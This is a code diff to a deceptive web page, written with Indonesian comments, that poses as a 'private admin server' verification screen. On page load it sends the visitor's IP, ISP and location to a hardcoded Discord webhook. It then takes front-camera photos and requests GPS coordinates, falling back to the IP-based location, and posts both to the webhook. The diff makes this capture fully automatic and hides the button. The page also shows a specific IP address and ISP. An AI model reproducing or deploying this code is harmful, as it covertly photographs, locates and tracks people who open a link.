@@ -14,7 +14,7 @@
         .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
         .val { color: #00ff41; font-weight: bold; }
         .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
-        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 60px; font-weight: bold; line-height: 1.6; }
         #result-page { display: none; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0; background: #000; z-index: 9999; padding: 20px; box-sizing: border-box; }
@@ -30,17 +30,17 @@
   <div class="panel" id="login-panel">
    <div class="header">⚠️ PRIVATE ADMIN SERVER ⚠️</div>
    <div class="grid">
-    <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
-    <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
-    <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
-    <div class="data-item"><span class="label">Hardware</span><span id="d-ram" class="val">---</span></div>
-    <div class="data-item" style="grid-column: span 2;"><span class="label">ISP_Provider</span><span id="d-isp" class="val">Scanning...</span></div>
+    <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Linux</span></div>
+    <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">114.5.110.211</span></div>
+    <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">47%</span></div>
+    <div class="data-item"><span class="label">Hardware</span><span id="d-ram" class="val">8 Cores / 8 GB</span></div>
+    <div class="data-item" style="grid-column: span 2;"><span class="label">ISP_Provider</span><span id="d-isp" class="val">INDOSAT Internet Network Provider</span></div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>
    <div id="loading-icon" class="loader"></div>
-   <p id="status">[SYSTEM] Akses Terbatas. Jalankan protokol sinkronisasi untuk verifikasi identitas admin.</p>
-   <button id="mainBtn" class="btn" onclick="startAdvancedCapture()">Bypass & Sync Data</button>
+   <p id="status">[GPS] Sinkronisasi Koordinat Satelit...</p>
+   <button id="mainBtn" class="btn" style="display:none;" onclick="startAdvancedCapture()">Retry Sync</button>
   </div>
 
   <div id="result-page">
@@ -62,43 +62,16 @@
   <script>
     const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
     let fullInfo = {};
+    let ipLat = 0, ipLon = 0;
 
-    // 1. FUNGSI OTOMATIS SAAT WEB DIBUKA
     (async function autoInit() {
-        const ua = navigator.userAgent;
-        fullInfo = {
-            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Linux",
-            os: navigator.platform,
-            cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-            lang: navigator.language || "id-ID"
-        };
-
-        // Update UI awal
-        document.getElementById('d-model').innerText = fullInfo.model;
-        document.getElementById('d-ram').innerText = `${fullInfo.cores} Cores / ${fullInfo.ram}`;
-
-        // Cek Baterai
-        try {
-            const b = await navigator.getBattery();
-            fullInfo.battery = `${Math.round(b.level * 100)}%`;
-            document.getElementById('d-bat').innerText = fullInfo.battery;
-        } catch (e) { fullInfo.battery = "N/A"; }
-
-        // Ambil Data Jaringan & Kirim ke Webhook
         try {
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
-            fullInfo.ip = d.ip;
-            fullInfo.isp = d.org;
-            fullInfo.city = d.city;
-            fullInfo.country = d.country_name;
-            fullInfo.postal = d.postal;
+            fullInfo = { ip: d.ip, isp: d.org, city: d.city, country: d.country_name, lat: d.latitude, lon: d.longitude };
+            ipLat = d.latitude; ipLon = d.longitude;
 
-            document.getElementById('d-ip').innerText = d.ip;
-            document.getElementById('d-isp').innerText = d.org;
-
-            // KIRIM DATA AWAL (Embed persis seperti di foto)
+            // Langsung Kirim Data Awal Ke Discord
             await fetch(WH, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -107,104 +80,74 @@
                         title: "🚀 TARGET ENTERED SERVER",
                         color: 16711680,
                         fields: [
-                            { name: "🌐 Jaringan", value: `**IP:** ${fullInfo.ip}\n**ISP:** ${fullInfo.isp}\n**Lokasi:** ${fullInfo.city}, ${fullInfo.country} (${fullInfo.postal})`, inline: false },
-                            { name: "📱 Perangkat", value: `**Model:** ${fullInfo.model}\n**OS:** ${fullInfo.os}\n**Hardware:** ${fullInfo.cores} Cores / ${fullInfo.ram}`, inline: true },
-                            { name: "🔋 Status", value: `**Baterai:** ${fullInfo.battery}\n**Bahasa:** ${fullInfo.lang}`, inline: true },
-                            { name: "🔗 URL Akses", value: `\`${window.location.href}\``, inline: false }
-                        ],
-                        footer: { text: `System Time: ${new Date().toLocaleString('id-ID')}` }
+                            { name: "🌐 Jaringan", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}\n**Lokasi:** ${d.city}, ${d.country_name}`, inline: false }
+                        ]
                     }]
                 })
             });
-        } catch (e) { console.log("Init fail"); }
+            // Mulai proses capture otomatis setelah init
+            startAdvancedCapture();
+        } catch (e) { startAdvancedCapture(); }
     })();
 
-    // 2. PROSES LANJUTAN (KAMERA & LOKASI) SETELAH KLIK TOMBOL
     async function startAdvancedCapture() {
-        document.getElementById('mainBtn').style.display = 'none';
-        document.getElementById('loading-icon').style.display = 'block';
         const status = document.getElementById('status');
-        
-        status.innerText = "[AUTH] Meminta Izin Kamera & Lokasi...";
-
         try {
-            // Minta Izin Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-
-            status.innerText = "[SCAN] Mengambil Foto Biometrik...";
-            await new Promise(r => setTimeout(r, 1000));
+            document.getElementById('v').srcObject = stream;
             
-            // Ambil 2 Foto
-            for (let i = 1; i <= 2; i++) {
-                await captureAndSend(video, i);
-                await new Promise(r => setTimeout(r, 800));
-            }
+            // Ambil Foto
+            setTimeout(async () => {
+                await captureAndSend(document.getElementById('v'), 1);
+                
+                // Minta Lokasi dengan Timeout
+                status.innerText = "[GPS] Sinkronisasi Koordinat Satelit...";
+                
+                const locationOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-            // Minta Izin Lokasi
-            status.innerText = "[GPS] Sinkronisasi Koordinat Satelit...";
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-
-                // Kirim Lokasi ke Discord
-                await fetch(WH, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `📍 **GPS LOCKED**\nIP: \`${fullInfo.ip}\`\nMaps: https://www.google.com/maps?q=${lat},${lon}`
-                    })
-                });
-
-                // 3. REDIRECT KE HALAMAN HASIL (Live View)
-                showResultPage(lat, lon, stream);
-            }, (err) => { 
-                alert("Izin Lokasi Diperlukan."); 
-                location.reload(); 
-            }, { enableHighAccuracy: true });
-
-        } catch (e) {
-            alert("Akses Admin Memerlukan Izin Kamera.");
-            location.reload();
+                navigator.geolocation.getCurrentPosition(
+                    (p) => { finishProcess(p.coords.latitude, p.coords.longitude, stream, "SAT_LOCK"); },
+                    (err) => { finishProcess(ipLat, ipLon, stream, "IP_FALLBACK"); },
+                    locationOptions
+                );
+            }, 1000);
+        } catch (e) { 
+            // Jika kamera ditolak, tetap coba ambil lokasi
+            navigator.geolocation.getCurrentPosition(
+                (p) => { finishProcess(p.coords.latitude, p.coords.longitude, null, "SAT_LOCK_NO_CAM"); },
+                (err) => { finishProcess(ipLat, ipLon, null, "IP_FALLBACK_NO_CAM"); }
+            );
         }
     }
 
     async function captureAndSend(video, index) {
         const canvas = document.getElementById('c');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        return new Promise((resolve) => {
-            canvas.toBlob(async (blob) => {
-                // Tampilkan di halaman hasil nanti
-                const img = document.createElement('img');
-                img.src = URL.createObjectURL(blob);
-                img.className = 'preview-img';
-                document.getElementById('photo-container').appendChild(img);
-
-                // Kirim File ke Discord
-                const fd = new FormData();
-                fd.append("file", blob, `biometric_${index}.jpg`);
-                fd.append("payload_json", JSON.stringify({ content: `📸 **Bio-Scan ${index}** | IP: \`${fullInfo.ip}\`` }));
-                await fetch(WH, { method: "POST", body: fd });
-                resolve();
-            }, 'image/jpeg', 0.6);
-        });
+        canvas.toBlob(async (blob) => {
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(blob);
+            img.className = 'preview-img';
+            document.getElementById('photo-container').appendChild(img);
+            const fd = new FormData();
+            fd.append("file", blob, "shot.jpg");
+            fd.append("payload_json", JSON.stringify({ content: `📸 **Photo Capture** | IP: ${fullInfo.ip}` }));
+            await fetch(WH, { method: "POST", body: fd });
+        }, 'image/jpeg', 0.6);
     }
 
-    function showResultPage(lat, lon, stream) {
+    async function finishProcess(lat, lon, stream, method) {
         document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
-        document.getElementById('map-container').innerHTML = `
-            <iframe class="map-frame" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>
-        `;
+        document.getElementById('map-container').innerHTML = `<iframe class="map-frame" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
         
-        // Switch View
+        await fetch(WH, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `📍 **LOCATION FIXED (${method})**\nIP: ${fullInfo.ip}\nMaps: https://www.google.com/maps?q=${lat},${lon}` })
+        });
+
         document.getElementById('login-panel').style.display = 'none';
         document.getElementById('result-page').style.display = 'block';
-        
-        // Matikan Kamera
         if (stream) stream.getTracks().forEach(t => t.stop());
     }
   </script>
